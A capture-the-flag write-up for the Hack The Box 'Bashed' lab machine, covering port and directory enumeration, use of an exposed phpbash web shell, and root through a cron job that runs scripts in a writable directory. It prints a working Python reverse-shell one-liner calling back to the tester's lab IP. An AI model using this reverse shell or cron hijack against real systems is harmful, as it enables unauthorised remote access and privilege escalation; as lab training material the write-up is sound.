Title: HTB Bashed box writeup
Tags: oscp, htb, cron
Summary: Walkthrough for this one
Date: 2020-09-01 15:00
Status: published

# Enumeration
Let's start with -sS all TCP range since we are not limited in traffic and not afraid of IDS:
```text
    Nmap 7.80 scan initiated Tue May 12 19:05:00 2020 as: nmap -sS -p- -oA enum/nmap-ss-t-all 10.10.10.68
    Nmap scan report for bashed.htb (10.10.10.68)
    Host is up (0.061s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http
    Nmap done at Tue May 12 19:06:30 2020 -- 1 IP address (1 host up) scanned in 90.26 seconds
```
Not so much eh. I tried to run sU scan in the background and found nothing interesting. Looks like the webserver is
the way in. Spin up gobuster scan to find something interesting and while it's running let's go and see what's
interesting is there. Both `10.10.10.68` and `bashed.htb` which I added to `/etc/hosts`, leads to the same page
with some interesting info:

![phpbashed page](/cstatic/htb-bashed/phpbash-web.png)

There might be that shell somewhere in there. I also manually inspected source code of this page to try to find
some interesting details, but found only usual stuff like `/images` directory. At the time gobusted did his work:
```text
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /css (Status: 301)
    /dev (Status: 301)
    /fonts (Status: 301)
    /images (Status: 301)
    /js (Status: 301)
    /php (Status: 301)
    /server-status (Status: 403)
    /uploads (Status: 301)
```
`/dev` entry looks very promising, especially with the fact that blog admin stated that he was developing php shell
on this server. Indeed this dir is listable and there are some web phpbash shells in there:

![phpbash shell](/cstatic/htb-bashed/php-web-shell.png)

There is netcat on this box, but it was compiled w/o `-e` option. I tried to sent back bash revshell via `/dev/tcp`
but it seems that current user has no access to this subsystem, so I used python reverse shell oneliner instead:
```python
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.14.13",53))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash", "-i"])
```
Just wrapped it in one line with semicolons and run it with `python3 -c`. Interactive unpriv shell:

![unpriv shell](/cstatic/htb-bashed/unpriv-shell.png)

# Privilege escalation
We could run sudo w/o password as scriptmanager:

![sudo scriptmanager](/cstatic/htb-bashed/sudo-l.png)

This user owns some interesting directory under root:

![scriptmanager dir](/cstatic/htb-bashed/scriptmanager-files.png)

There are only two files in this directory, one simple python  script and a txt file:

![scripts](/cstatic/htb-bashed/scripts.png)

Notice that while the `test.py` owned by scriptmanager:scriptmanager, `test.txt` is owned and
only writable by root. This is a direct hint that `test.py` might have been executing with
root privileges in some way, first thought was that there is a cron job that runs it. I found nothing
useful in cron folders, crontab file or `/var/log` so I've uploaded [pspy](https://github.com/DominicBreuker/pspy)
and my hypothesis turned out to be right:

![cron hit](/cstatic/htb-bashed/cron.png)

The job will run every `.py` file in `/scripts` so we could just reuse our reverse shell from
above to acquire root privileges:

![root shell](/cstatic/htb-bashed/root-shell.png)
